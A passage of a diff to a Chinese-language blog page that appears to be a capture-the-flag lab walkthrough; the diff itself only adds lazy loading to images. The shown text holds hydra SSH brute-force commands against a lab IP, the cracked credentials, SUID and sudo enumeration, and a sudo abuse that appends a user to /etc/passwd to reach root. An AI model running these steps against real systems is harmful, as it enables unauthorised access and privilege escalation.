 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hydra</span> -L user.txt -P pass.txt -vV -t <span class="hljs-number">5</span> <span class="hljs-number">192.168.234.138</span> ssh<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-84.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-84.png"></p>
 <p>爆破出来三个</p>
 <figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[22]</span><span class="hljs-comment">[ssh]</span> host: 192.168.234.138   login: chandlerb   password: UrAG0D!<br><span class="hljs-comment">[22]</span><span class="hljs-comment">[ssh]</span> host: 192.168.234.138   login: joeyt   password: Passw0rd<br><span class="hljs-comment">[22]</span><span class="hljs-comment">[ssh]</span> host: 192.168.234.138   login: janitor   password: Ilovepeepee<br></code></pre></td></tr></table></figure>
 
@@ -5128,7 +5113,7 @@
 <p>进去先查看suid</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br><br><span class="hljs-built_in">ls</span> -/ /etc/passwd<br><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-85.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-85.png"></p>
 <p>joeyt</p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> joeyt@<span class="hljs-number">192.168.234.138</span><br></code></pre></td></tr></table></figure>
 
@@ -5197,7 +5182,7 @@
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/opt/</span>devstuff<span class="hljs-regexp">/dist/</span>test<span class="hljs-regexp">/test /</span>tmp<span class="hljs-regexp">/user.txt /</span>etc/passwd<br></code></pre></td></tr></table></figure>
 
 <p>可以看到成功追加</p>
-<p><img src="C:/Users/Administrator/myBlog/source/image/ISW-86.png"></p>
+<p><img loading="lazy" src="C:/Users/Administrator/myBlog/source/image/ISW-86.png"></p>
 <p>su切换用户即可</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">su admin<br>admin<br><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> theflag.txt<br></code></pre></td></tr></table></figure>
 
